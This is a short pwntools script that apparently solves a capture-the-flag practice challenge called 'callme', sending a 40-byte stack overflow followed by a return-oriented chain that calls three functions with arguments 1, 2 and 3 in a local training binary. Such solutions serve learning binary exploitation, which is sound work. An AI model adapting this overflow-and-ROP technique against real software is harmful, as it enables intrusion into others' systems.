from pwn import *

p = process("./callme")
callme_one = 0x401850
callme_two = 0x401870
callme_three = 0x401810
gadgets = 0x401ab0
args = p64(1)+p64(2)+p64(3)

payload = ''
payload += "A"*40
payload += p64(gadgets)
payload += args
payload += p64(callme_one)
payload += p64(gadgets)
payload += args
payload += p64(callme_two)
payload += p64(gadgets)
payload += args
payload += p64(callme_three)

p.sendline(payload)
p.interactive()
